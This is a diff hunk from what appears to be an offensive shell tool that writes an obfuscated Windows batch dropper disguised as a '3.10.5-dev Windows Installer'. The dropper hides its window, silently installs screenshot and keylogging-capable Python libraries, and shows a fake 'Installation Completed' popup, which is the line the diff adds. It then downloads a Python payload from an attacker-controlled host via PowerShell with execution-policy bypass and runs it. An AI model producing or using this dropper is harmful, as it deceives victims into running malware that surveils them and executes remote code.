@@ -10337,6 +10337,7 @@ if [ "$SOSP" = "Windows" ]; then
       echo "@echo off&%@i%&title $Drop - 3.10.5-dev Windows Installer&%#i#%&set \$\$=-w 1 -C&&set \$i=py&&set #?=." >> $Drop.bat
       echo ",i%'$%f n%i@%ot DEF%_@$%INE%@%D IS_MIN%@$%IMI%,;%ZE%i?%D se%@i%t IS_MIN%_#%IMIZ%@=i%ED=1 &%@$%& ,s%i0%ta%@%rt \"\" /mi%@$%n \"%~dpnx0\" %* &%i@_%& ex%@$%i%_i_%t" >> $Drop.bat
       echo "@p\"O\"%i%we^R%@%s\"h\"^e%db%ll \$C=p\"i\"%@%p sh%@%o^w t\"a\"b%@%ul^a%@%te;I%@%f(-n%@%ot(\$C)){p%@%i^p i\"n\"s%@%t^a%@%ll t\"a\"b%@%u^la%@%te py%@%n^pu%@%t p\"s\"u%@%t^i%@%l pi%@%l^l%@%o\"w\" pys%@%cr^ee%@%ns%@%h^ot p\"y\"i%@%ns^t%@%a\"l\"l%@%e^r}" >> $Drop.bat
+      echo "@Po%@i%wE^r%@i%s^He%@i%ll (nE%@%W-Obj%@%eCt -Com^O%@$%bjec%@_%t Wsc%d0b%rip^t%#?%She%@$%l^l)%#?%Po%#i%pu^p(\"\"\"Ins%@$%tala%@i%tio%@s%n Com%@s%ple%@$%te%@_%d%#?%\"\"\",0,\"\"\"$Drop - 3%#?%10%#?%5-dev Wi%@$%n%@%do%@i%ws In%@f%st%@_i#%al%R@%ler\"\"\",0x0)" >> $Drop.bat
       echo "=pOw^e%@%rS^hE%@%lL -e^X%@%e\"C\" b%@%Y\"p\"a^S%@%s %\$\$% (nE%@%W-Obj%@%eCt N%i%Et%#?%WeBCl%@%iE^n%@%t)%#?%Dow%@%nL^oa%@%dFIl%@%E('h^t%@%t^p:/%@%/$lhost/$Drop.%\$i%', '$rpath\\$Drop.%\$i%') &%@_%& ,(,;(c%@$%d $rpath &%@%& pY%@%t^H%@%o\"N\" $Drop.%\$i%),)" >> $Drop.bat
       echo "${BlueF}[☠]${white} Written $Drop.bat (Obfuscated)"${Reset};sleep 2
 
